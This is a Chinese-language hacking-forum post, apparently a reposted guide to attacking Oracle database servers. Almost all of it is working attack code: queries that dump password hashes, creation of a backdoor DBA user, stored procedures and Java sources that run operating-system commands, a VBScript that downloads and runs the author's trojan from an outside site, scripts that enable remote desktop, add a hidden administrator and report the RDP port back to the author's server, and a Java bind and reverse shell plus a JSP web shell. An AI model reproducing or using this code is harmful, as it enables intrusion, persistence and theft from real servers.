@@ -1,0 +1,1011 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+oracle技术文档
+D8888D主贴内容-------------------------------------------------------
+第一部分
+
+基本查询指令 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01select * from V$PWFILE_USERS //查看dba用户 
+
+02select * from v$version //查看oracle版本以及系统版本 
+
+03select * from session_privs;// 查看当前用户拥有的权限值 
+
+04select * from user_role_privs\\查询当前用户角色 
+
+05select * from user_sys_privs\\查询当前用户系统权限 
+
+06  
+
+07  
+
+08select username,password from dba_users; //查看所有用户密码hash 
+
+09select * from dba_sys_privs where grantee='SYSTEM';\\查系统权限 
+
+10grant select any dictionary to system with admin option;\\登陆不上OEM时候需要此权限 
+
+11Select name,password FROM user$ Where name='SCOTT'; //低版本查看单用户密码 
+
+12Select username,decode(password,NULL,'NULL',password) password FROM dba_users; //查看用户hash 
+
+13create user bob identified by iloveyou;\\建用户bob密码iloveyou 
+
+14grant dba to bob;\\赋予bob DBA权限 
+
+15grant execute on xmldom to bob \\赋予用户execute
+
+16Create ROLE "javauserpriv" NOT IDENTIFIED 
+
+17Create ROLE "javasyspriv" NOT IDENTIFIED \\当提示role 'JAVASYSPRIV' does not exist使用 
+
+18select grantee from dba_role_privs where granted_role='DBA'; \\检查那些用户有DBA权限 
+
+19select * from dba_directories;\\查看路径所在目录
+第二部分,创建java,执行系统命令 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01Create or REPLACE LIBRARY exec_shell AS 'c:\windows\system32\msvcrt.dll'; 
+
+02/ 
+
+03show errors 
+
+04Create or REPLACE PACKAGE oracmd IS PROCEDURE exec (cmdstring IN CHAR); 
+
+05end oracmd; 
+
+06/ 
+
+07show errors 
+
+08Create or REPLACE PACKAGE BODY oracmd IS
+
+09PROCEDURE exec(cmdstring IN CHAR) 
+
+10IS EXTERNAL 
+
+11NAME "system"
+
+12LIBRARY exec_shell 
+
+13LANGUAGE C; 
+
+14end oracmd; 
+
+15/ 
+
+16show errors
+上面这个没有回显的
+
+如果不行可以使用下面这个 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01Create or REPLACE LIBRARY exec_shell AS '$ORACLE_HOME\msvcrt.dll'; 
+
+02/ 
+
+03show errors 
+
+04Create or REPLACE PACKAGE oracmd IS PROCEDURE exec (cmdstring IN CHAR); 
+
+05end oracmd; 
+
+06/ 
+
+07show errors 
+
+08Create or REPLACE PACKAGE BODY oracmd IS
+
+09PROCEDURE exec(cmdstring IN CHAR) 
+
+10IS EXTERNAL 
+
+11NAME "system"
+
+12LIBRARY exec_shell 
+
+13LANGUAGE C; 
+
+14end oracmd; 
+
+15/ 
+
+16show errors
+执行完后
+执行 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1exec oracmd.exec ('net1 user robert iloveyou /add');
+no2. [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]001Create or REPLACE AND COMPILE JAVA SOURCE NAMED "Host" AS
+
+002import java.io.*; 
+
+003public class Host { 
+
+004public static void executeCommand(String command) { 
+
+005try { 
+
+006String[] finalCommand; 
+
+007if (isWindows()) { 
+
+008finalCommand = new String[4]; 
+
+009// Use the appropriate path for your windows version. 
+
+010finalCommand[0] = "C:\\windows\\system32\\cmd.exe";  // Windows XP/2003 
+
+011//finalCommand[0] = "C:\\winnt\\system32\\cmd.exe";  // Windows NT/2000 
+
+012finalCommand[1] = "/y"; 
+
+013finalCommand[2] = "/c"; 
+
+014finalCommand[3] = command; 
+
+015} 
+
+016else { 
+
+017finalCommand = new String[3]; 
+
+018finalCommand[0] = "/bin/sh"; 
+
+019finalCommand[1] = "-c"; 
+
+020finalCommand[2] = command; 
+
+021} 
+
+022  
+
+023final Process pr = Runtime.getRuntime().exec(finalCommand); 
+
+024pr.waitFor(); 
+
+025  
+
+026new Thread(new Runnable(){ 
+
+027public void run() { 
+
+028BufferedReader br_in = null; 
+
+029try { 
+
+030br_in = new BufferedReader(new InputStreamReader(pr.getInputStream())); 
+
+031String buff = null; 
+
+032while ((buff = br_in.readLine()) != null) { 
+
+033System.out.println("Process out :" + buff); 
+
+034try {Thread.sleep(100); } catch(Exception e) {} 
+
+035} 
+
+036br_in.close(); 
+
+037} 
+
+038catch (IOException ioe) { 
+
+039System.out.println("Exception caught printing process output."); 
+
+040ioe.printStackTrace(); 
+
+041} 
+
+042finally { 
+
+043try { 
+
+044br_in.close(); 
+
+045} catch (Exception ex) {} 
+
+046} 
+
+047} 
+
+048}).start(); 
+
+049  
+
+050new Thread(new Runnable(){ 
+
+051public void run() { 
+
+052BufferedReader br_err = null; 
+
+053try { 
+
+054br_err = new BufferedReader(new InputStreamReader(pr.getErrorStream())); 
+
+055String buff = null; 
+
+056while ((buff = br_err.readLine()) != null) { 
+
+057System.out.println("Process err :" + buff); 
+
+058try {Thread.sleep(100); } catch(Exception e) {} 
+
+059} 
+
+060br_err.close(); 
+
+061} 
+
+062catch (IOException ioe) { 
+
+063System.out.println("Exception caught printing process error."); 
+
+064ioe.printStackTrace(); 
+
+065} 
+
+066finally { 
+
+067try { 
+
+068br_err.close(); 
+
+069} catch (Exception ex) {} 
+
+070} 
+
+071} 
+
+072}).start(); 
+
+073} 
+
+074catch (Exception ex) { 
+
+075System.out.println(ex.getLocalizedMessage()); 
+
+076} 
+
+077} 
+
+078  
+
+079public static boolean isWindows() { 
+
+080if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) 
+
+081return true; 
+
+082else
+
+083return false; 
+
+084} 
+
+085  
+
+086}; 
+
+087/ 
+
+088Create or REPLACE PROCEDURE host_command (p_command  IN  VARCHAR2) 
+
+089AS LANGUAGE JAVA 
+
+090NAME 'Host.executeCommand (java.lang.String)'; 
+
+091/ 
+
+092EXEC DBMS_JAVA.grant_permission('SYSTEM', 'java.io.FilePermission', '<>', 'read ,write, execute, delete'); 
+
+093EXEC Dbms_Java.Grant_Permission('SYSTEM', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', ''); 
+
+094EXEC Dbms_Java.Grant_Permission('SYSTEM', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', ''); 
+
+095/ 
+
+096DECLARE
+
+097l_output DBMS_OUTPUT.chararr; 
+
+098l_lines  INTEGER := 1000; 
+
+099BEGIN
+
+100DBMS_OUTPUT.enable(1000000); 
+
+101DBMS_JAVA.set_output(1000000); 
+
+102  
+
+103host_command('dir C:\'); 
+
+104  
+
+105DBMS_OUTPUT.get_lines(l_output, l_lines); 
+
+106END;
+这个要注意两点
+win下注意系统路径
+linx下注意注释掉win
+最后一句就是执行命令的 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1host_command('dir C:\');
+no3. [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01create or replace and compile 
+
+02java souRCe named "util"
+
+03as
+
+04import java.io.*; 
+
+05import java.lang.*; 
+
+06public class util extends Object 
+
+07{ 
+
+08public static int RunThis(String args) 
+
+09{ 
+
+10Runtime rt = Runtime.getRuntime(); 
+
+11int RC = -1; 
+
+12try 
+
+13{ 
+
+14Process p = rt.exec(args); 
+
+15int bufSize = 4096; 
+
+16BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize); 
+
+17int len; 
+
+18byte buffer[] = new byte[bufSize]; 
+
+19// Echo back what the program spit out
+
+20while ((len = bis.read(buffer, 0, bufSize)) != -1) 
+
+21System.out.write(buffer, 0, len); 
+
+22RC = p.waitFor(); 
+
+23} 
+
+24catch (Exception e) 
+
+25{ 
+
+26e.printStackTrace(); 
+
+27RC = -1; 
+
+28} 
+
+29finally 
+
+30{ 
+
+31return RC; 
+
+32} 
+
+33} 
+
+34} 
+
+35/ 
+
+36create or replace
+
+37function RUN_CMz(p_cmd in varchar2) return number 
+
+38as
+
+39language java 
+
+40name 'util.RunThis(java.lang.String) return integer'; 
+
+41/ 
+
+42create or replace procedure RC(p_cmd in varChar) 
+
+43as
+
+44x number; 
+
+45begin
+
+46x := RUN_CMz(p_cmd); 
+
+47end; 
+
+48/ 
+
+49variable x number; 
+
+50set serveroutput on; 
+
+51exec dbms_java.set_output(100000); 
+
+52grant javasyspriv to system;
+这句注意最后这里要授权下当前登陆的用户 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1grant javasyspriv to system
+最后执行 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1exec :x:=run_cmz('ipconfig');
+第二部分 操作磁盘文件
+no1.
+建立目录 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1create or replace directory DIR as 'C:\';
+此目录当然也可以是启动目录
+
+授权 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1grant read, write on directory DIR to system
+这步可以不用
+然后执行操作
+写文件 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01declare
+
+02file utl_file.file_type; 
+
+03begin
+
+04file := utl_file.fopen('DIR', 'test.vbs', 'W'); 
+
+05utl_file.put_line(file, 'Set xPost=CreateObject("Microsoft.XMLHTTP") 
+
+06xPost.Open "GET","http:/ /blog.cnmoker.org/rad.exe",0 
+
+07xPost.Send() 
+
+08Set sGet=CreateObject("ADODB.Stream") 
+
+09sGet.Mode=3 
+
+10sGet.Type=1 
+
+11sGet.Open() 
+
+12sGet.Write(xPost.responseBody) 
+
+13sGet.SaveToFile "c:\rad.exe",2'); 
+
+14utl_file.fflush(file); 
+
+15utl_file.fclose(file); 
+
+16end; 
+
+17/ 
+
+18exec :x:=run_cmz('cscript c:\test.vbs'); 
+
+19/ 
+
+20exec :x:=run_cmz('c:\rad.exe');
+这步操作讲下载我的木马到c盘并执行 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01declare
+
+02file utl_file.file_type; 
+
+03begin
+
+04file := utl_file.fopen('DIR', '3389.vbs', 'W'); 
+
+05utl_file.put_line(file, 'Dim OperationRegistry 
+
+06Set OperationRegistry=WScript.createObject("WScript.Shell") 
+
+07Dim TSPort,TSState,TSRegPath 
+
+08TSRegPath="HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber" 
+
+09TSPort=OperationRegistry.RegRead(TSRegPath) 
+
+10TSRegPath="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections" 
+
+11TSState=OperationRegistry.RegRead(TSRegPath) 
+
+12If TSState=0 Then 
+
+13Else 
+
+14OperationRegistry.RegWrite TSRegPath,0,"REG_DWORD" 
+
+15End If'); 
+
+16utl_file.fflush(file); 
+
+17utl_file.fclose(file); 
+
+18end; 
+
+19/ 
+
+20exec :x:=run_cmz('cscript c:\3389.vbs');
+vbs开启3389 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01declare
+
+02file utl_file.file_type; 
+
+03begin
+
+04file := utl_file.fopen('DIR', 'user.vbs', 'W'); 
+
+05utl_file.put_line(file, 'set wsnetwork=CreateObject("WSCRIPT.NETWORK") 
+
+06os="[url=winnt:///]链接标记WinNT://[/url]"'||'&'||'wsnetwork.ComputerName 
+
+07Set oa=CreateObject("Scripting.FileSystemObject") 
+
+08Set ob=GetObject(os) 
+
+09Set oe=GetObject(os&"/Administrators,group") 
+
+10Set od=ob.Create("user","bob") 
+
+11od.SetPassword "123456abc!@#" 
+
+12od.SetInfo 
+
+13Set of=GetObject(os&"/bob",user) 
+
+14oe.add os&"/bob" 
+
+15oa.DeleteFile("user.vbs")'); 
+
+16utl_file.fflush(file); 
+
+17utl_file.fclose(file); 
+
+18end; 
+
+19/ 
+
+20/ 
+
+21exec :x:=run_cmz('cscript c:\user.vbs');
+无net添加admin用户 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01declare
+
+02file utl_file.file_type; 
+
+03begin
+
+04file := utl_file.fopen('DIR', '3389p.vbs', 'W'); 
+
+05utl_file.put_line(file, ' 
+
+06  
+
+07Dim OperationRegistry 
+
+08Set OperationRegistry=WScript.createObject("WScript.Shell") 
+
+09Dim TSPort,TSState,TSRegPath 
+
+10TSRegPath="HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber" 
+
+11TSPort=OperationRegistry.RegRead(TSRegPath) 
+
+12  
+
+13Set xPost=CreateObject("Microsoft.XMLHTTP") 
+
+14xPost.Open "GET","[url=http://blog.cnmoker.org/read3389/ro.asp?port=]链接标记http://blog.cnmoker.org/read3389/ro.asp?port=[/url]" '||'ccccc'||' TSPort,0 
+
+15xPost.Send() 
+
+16  
+
+17TSRegPath="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections" 
+
+18TSState=OperationRegistry.RegRead(TSRegPath) 
+
+19If TSState=0 Then 
+
+20Else 
+
+21OperationRegistry.RegWrite TSRegPath,0,"REG_DWORD" 
+
+22End If 
+
+23set obj=wscript.createObject("wscript.shell") 
+
+24obj.Run("sc config TermService start= demand") 
+
+25obj.Run("sc stop  TermService") 
+
+26obj.Run("sc start TermService") 
+
+27wscript.quit 
+
+28'); 
+
+29utl_file.fflush(file); 
+
+30utl_file.fclose(file); 
+
+31end; 
+
+32/ 
+
+33exec :x:=run_cmz('cscript c:\3389p.vbs'); 
+
+34/ 
+
+35exec :x:=run_cmz('del c:\3389p.vbs'); 
+
+36/ 
+
+37[url][url=http://blog.cnmoker.org/read3389/]链接标记http://blog.cnmoker.org/read3389/[/url]read.asp[/url]
+这个代码的作用是用来读取对方的3389端口并post下自己的网站数据库里
+这个read.asp和ro.asp自己写吧
+到此win下操作基本上是完成了
+
+第三部分 linux的一些操作
+
+linux的操作要用到sqlj语言
+其实ISTO的kj总早就写了一些
+我总结 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]001create or replace and compile java source named bob as
+
+002import java.io.*; 
+
+003import java.net.*; 
+
+004public class BOB{ 
+
+005public static String listFolder(String path){ 
+
+006File f=null; 
+
+007String str=""; 
+
+008f=new File(path); 
+
+009String[] files=f.list(); 
+
+010if(files!=null) 
+
+011for(int i=0;i<files.length;i++){ 
+
+012str+=files[i]+"\r\n"; 
+
+013} 
+
+014return str; 
+
+015} 
+
+016public static String saveFile(String filepath,String value){ 
+
+017FileOutputStream fos=null; 
+
+018try { 
+
+019fos=new FileOutputStream(filepath); 
+
+020fos.write(value.getBytes()); 
+
+021return "OK"; 
+
+022} catch (Exception e) { 
+
+023return e.getMessage(); 
+
+024} finally{ 
+
+025if(fos!=null){ 
+
+026try {fos.close();} catch (Exception e) {} 
+
+027} 
+
+028} 
+
+029} 
+
+030public static String readFile(String pathfile,String code){ 
+
+031BufferedReader br=null; 
+
+032String value=""; 
+
+033try { 
+
+034br=new BufferedReader(new InputStreamReader(new FileInputStream(pathfile),code)); 
+
+035String s=null; 
+
+036while((s=br.readLine())!=null){ 
+
+037value+=s; 
+
+038} 
+
+039return value; 
+
+040} catch (Exception e) { 
+
+041return e.getMessage(); 
+
+042} finally{ 
+
+043if(br!=null){try {br.close();} catch (IOException e) {}} 
+
+044} 
+
+045} 
+
+046public static String execFile(String filepath,String code){ 
+
+047int i=0; 
+
+048Runtime rt=Runtime.getRuntime(); 
+
+049String output=""; 
+
+050InputStreamReader isr = null; 
+
+051char[] bufferC=new char[1024]; 
+
+052try{ 
+
+053Process ps=rt.exec(filepath); 
+
+054isr=new InputStreamReader(ps.getInputStream(),code); 
+
+055while((i=isr.read(bufferC,0,bufferC.length))!=-1){ 
+
+056output+=new String(bufferC,0,i); 
+
+057} 
+
+058return output; 
+
+059}catch(Exception e){ 
+
+060return e.getMessage(); 
+
+061}finally{ 
+
+062if(isr!=null)try {isr.close();} catch (IOException e) {} 
+
+063} 
+
+064} 
+
+065public static String bindShell(int port){ 
+
+066ServerSocket ss=null; 
+
+067Socket s=null; 
+
+068try { 
+
+069ss = new ServerSocket(port); 
+
+070s=ss.accept(); 
+
+071new optShell(ss,s).start(); 
+
+072  
+
+073return "OK"; 
+
+074} catch (Exception e) { 
+
+075return e.getMessage(); 
+
+076} 
+
+077} 
+
+078public static String reverseShell(String host,int port){ 
+
+079Socket s=null; 
+
+080try{ 
+
+081s=new Socket(host,port); 
+
+082new optShell(null,s).start(); 
+
+083return "OK"; 
+
+084}catch(Exception e){ 
+
+085return e.getMessage(); 
+
+086} 
+
+087} //反弹shell的sqlj语句 
+
+088public static class optShell extends Thread{ 
+
+089OutputStream os=null; 
+
+090InputStream is=null; 
+
+091ServerSocket ss; 
+
+092Socket s; 
+
+093public optShell(ServerSocket ss,Socket s){ 
+
+094this.ss=ss; 
+
+095this.s=s; 
+
+096try{ 
+
+097this.is=s.getInputStream(); 
+
+098this.os=s.getOutputStream(); 
+
+099}catch(Exception e){ 
+
+100if(os!=null)try {os.close();} catch(Exception ex) {} 
+
+101if(is!=null)try {is.close();} catch(Exception ex) {} 
+
+102if(s!=null)try {s.close();} catch(Exception ex) {} 
+
+103if(ss!=null)try {ss.close();} catch(Exception ex) {} 
+
+104} 
+
+105} 
+
+106public void run(){ 
+
+107BufferedReader br=new BufferedReader(new InputStreamReader(is)); 
+
+108String line=""; 
+
+109String cmdhelp="Command:\r\nlist \r\nsave\r\nread\r\nexec\r\nexit\r\n"; 
+
+110try { 
+
+111//os.write(cmdhelp.getBytes()); 
+
+112line=br.readLine(); 
+
+113while(!"exit".equals(line)){ 
+
+114if(line.length()>3){ 
+
+115StringBuffer sb=new StringBuffer(line.trim()); 
+
+116String cmd=sb.substring(0, 4); 
+
+117if(cmd.equals("list")){ 
+
+118os.write("input you path:\r\n".getBytes()); 
+
+119line=br.readLine(); 
+
+120os.write(listFolder(line).getBytes()); 
+
+121}else if("save".equals(cmd)){ 
+
+122os.write("input you filepath:\r\n".getBytes()); 
+
+123line=br.readLine(); 
+
+124os.write("input you value:\r\n".getBytes()); 
+
+125os.write(saveFile(line,br.readLine()).getBytes()); 
+
+126}else if("read".equals(cmd)){ 
+
+127os.write("input you filepath:\r\n".getBytes()); 
+
+128line=br.readLine(); 
+
+129os.write("input you code examle:GBK\r\n".getBytes()); 
+
+130os.write(readFile(line,br.readLine()).getBytes()); 
+
+131}else if("exec".equals(cmd)){ 
+
+132os.write("input you run filepath:\r\n".getBytes()); 
+
+133line=br.readLine(); 
+
+134os.write("input you code examle:GBK\r\n".getBytes()); 
+
+135os.write(execFile(line,br.readLine()).getBytes()); 
+
+136}else{ 
+
+137os.write(cmdhelp.getBytes()); 
+
+138} 
+
+139}else{ 
+
+140os.write(cmdhelp.getBytes()); 
+
+141} 
+
+142line=br.readLine(); 
+
+143} 
+
+144} catch (Exception e) { 
+
+145e.printStackTrace(); 
+
+146}finally{ 
+
+147if(os!=null)try {os.close();} catch(Exception e) {} 
+
+148if(is!=null)try {is.close();} catch(Exception e) {} 
+
+149if(s!=null)try {s.close();} catch(Exception e) {} 
+
+150if(ss!=null)try {ss.close();} catch(Exception e) {} 
+
+151} 
+
+152} 
+
+153} 
+
+154} 
+
+155/ 
+
+156create or replace function BOB_LISTFOLDER(str varchar2) return varchar2 
+
+157as language java name 'BOB.listFolder(java.lang.String) return java.lang.String'; 
+
+158/ 
+
+159create or replace function BOB_SAVEFILE(p varchar2,v varchar2) return varchar2 
+
+160as language java name 'BOB.saveFile(java.lang.String,java.lang.String) return java.lang.String'; 
+
+161/ 
+
+162create or replace function BOB_READFILE(p varchar2,c varchar2) return varchar2 
+
+163as language java name 'BOB.readFile(java.lang.String,java.lang.String) return java.lang.String'; 
+
+164/ 
+
+165create or replace function BOB_EXECFILE(fp varchar2,c varchar2) return varchar2 
+
+166as language java name 'BOB.execFile(java.lang.String,java.lang.String) return java.lang.String'; 
+
+167/ 
+
+168create or replace function BOB_BINDSHELL(port number) return varchar2 
+
+169as language java name 'BOB.bindShell(int) return java.lang.String'; 
+
+170/ 
+
+171begin
+
+172Dbms_Java.Grant_Permission('scott','java.io.FilePermission','<<ALL FILES>>','read,write,execute,delete'); 
+
+173Dbms_Java.Grant_Permission('scott','java.lang.RuntimePermission','*','writeFileDescriptor'); 
+
+174Dbms_Java.grant_permission('scott','java.net.SocketPermission','*:*','accept,connect,listen,resolve'); 
+
+175end;
+这么一大段,仔细看
+执行完后 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1Select BOB_LISTFOLDER('/usr') FROM DUAL //列目录 
+
+2Select BOB_EXECFILE('C:\WINDOWS\system32\cmd.exe /c dir c:\','GBK') FROM DUAL; //执行命令 
+
+3Select BOB_READFILE('/tmp/1.txt','GBK') FROM DUAL; //读文件 
+
+4Select BOB_SAVEFILE('/tmp/1.jsp','<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>') FROM DUAL; 写jsp一句话 可查看我的上一篇BLOG 
+
+5Select BOB_BINDSHELL(20000) FROM DUAL //开启端口2000然后你telnet ip 2000上去
+其中本来还有reserver shell的
+我还没来的及测试
+我自己是更中意反弹shell的
+特别是linux
+好操作的多
+再说有时候linux是nat出来的
+反弹就去了许多麻烦
+
+第四部分 技巧
+
+一句话读取3389端口 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1exec :x:=run_cmz('REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber');
+一句话开3389 只合适win 2k3 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1exec :x:=run_cmz('REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f');
+删除pcanywhere导致的终端登陆错误 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1exec :x:=run_cmz('reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v GinaDLL /f');
+谢谢作者信心整理，耐心看看很不错。
